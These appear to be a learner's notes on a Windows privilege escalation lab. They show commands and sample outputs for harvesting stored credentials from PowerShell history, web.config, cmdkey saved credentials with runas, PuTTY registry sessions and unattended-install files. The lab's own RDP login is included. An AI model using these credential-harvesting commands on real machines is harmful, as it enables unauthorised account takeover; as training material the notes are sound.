_______rdp creds_______
|Username: thm-priv   |
|Password: Password321|
-----------------------


The easiest way to gain access to another user is to gather credentials from a compromised machine. Such credentials could exist for many reasons, including a careless user leaving them around in plaintext files; or even stored by some software like browsers or email clients.

(connect via rdp)
Q1. PowerShell History
    Open cmd and run
        input   :   type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
        outpt   :   ...
                    cmdkey /add:thmdc.local /user:julia.jones /pass:<PASSWD>
                    ...

Q2. IIS Configuration
    IIS//Internet Information Services  :   the default web server on windows installations
    web.configuration                   :   configuration file of websites that can store passwords for databases or configured authentication mechanisms
    Open cmd and run the following commands to search the config file
        input   :   type C:\inetpub\wwwroot\web.config | findstr connectionString
        outpt   :   The system cannot find the file specified.
        Maybe its not here

        Try
        input   :   type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
        outpt   :   ...
                    <connectionStrings>
                        <add connectionString="Server=thm-db.local;Database=thm-sekure;User ID=db_admin;Password=<PASSWD>"<> name="THM-DB" />
                    </connectionStrings>

Q3.  Saved Windows Credentials
    List them
        input   :   cmdkey /list
        outpt   :   Target: Domain:interactive=WPRIVESC1\mike.katz
                    Type: Domain Password
                    User: WPRIVESC1\mike.katz
    Interesting!

    Lets connect with a shell to this user (mike.katz) via runas
        input   :   runas /savedcred /user:mike.katz cmd.exe
        outpt   :   Shell opens to a new window! Hit "whoami" to verify the user

    Now head to finding the flag
        input   :   type <PATH_TO_FLAG>.txt
        outpt   :   <FLAG>

Q4. Software Credential Retrieval (PuTTY)
    PuTTY is an SSH client commonly found on Windows systems and stores the proxy configurations with cleartext authentication credentials
        input   :   reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
        outpt   :       ...
                        ProxyUsername    REG_SZ    thom.smith
                        ProxyPassword    REG_SZ    <PASSWD>
                        ...
        Tip     :   Just as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.


Honorable Mention

Unattended Windows Installations
    Unattnded Windows Installations :   At the installation progress on a vast number of machines that are intended for windows set up, admins may use Windows Deployment Service. This allows a single os image to be deployed to
                                        several machines through the network
    Look into the folloing paths for initial setup files:
        - C:\Unattend.xml
        - C:\Unattend.xml
        - C:\Windows\Panther\Unattend.xml
        - C:\Windows\Panther\Unattend\Unattend.xml
        - C:\Windows\system32\sysprep.inf
        - C:\Windows\system32\sysprep\sysprep.xml
